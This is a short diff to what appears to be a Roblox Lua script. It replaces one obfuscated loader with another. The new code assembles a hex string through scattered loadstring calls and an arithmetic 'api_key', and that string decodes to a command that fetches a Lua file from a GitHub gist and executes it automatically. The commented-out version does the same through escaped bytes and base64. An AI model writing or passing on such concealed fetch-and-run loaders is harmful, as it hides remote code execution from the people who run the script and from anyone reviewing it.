@@ -50,6 +50,7 @@ function decodeink(data, autolaunch, mode)
     end
 end
 
+--[[
 api_decode = function(api_keys)
 if not api_keys then return nil end
 local data = api_keys
@@ -57,3 +58,8 @@ return ""..decodeink("aHR0cHM=", false, 2).."://"..loadstring('return "\103\105\
 end
 
 return loadstring(game:HttpGet(tostring(api_decode({[1]="81253c\48\56\55\52c84e33b5ae5c70a\99\50\57eaa9";[2]="\51\51"..loadstring('return "cf9f"')().."\50\49\98\97\102ea\100\51\52\102\56\57\49\54\97f114becaadc73\52\57\51\52";[3]="obf-handler."..webhold["file-type"].."";}))))()
+]]--
+local url = {}
+url["url"] = "6C6F616473747"..loadstring('return "2696E672867616D653A48747470476574282268747470733A2F2F676973742E6769746875627"', true)().."5736572636F6E74656E742E636F6D2F50726F3"..loadstring('return "\54\51\54\51\54\53\48\55\50\54\70\50\70\51\56\51\49\51\50\51\53\51\51\54\51\51\48\51\56\51\55\51\52\54\51\51\56\51\52\54\53\51\51\51\51\54\50\51\53\54\49\54\53\51\53\54"')().."3373061633239656161392F7261772F333363663966323162616665616433346638393136616631313462656361616463373334393833342F6F62662D68616E646C65722E6C75612229292829"
+url["api_key"] = tonumber(12254 - 2189 * 6 + 882)
+return decodeink(url["url"], loadstring('return true', true)(), url["api_key"])
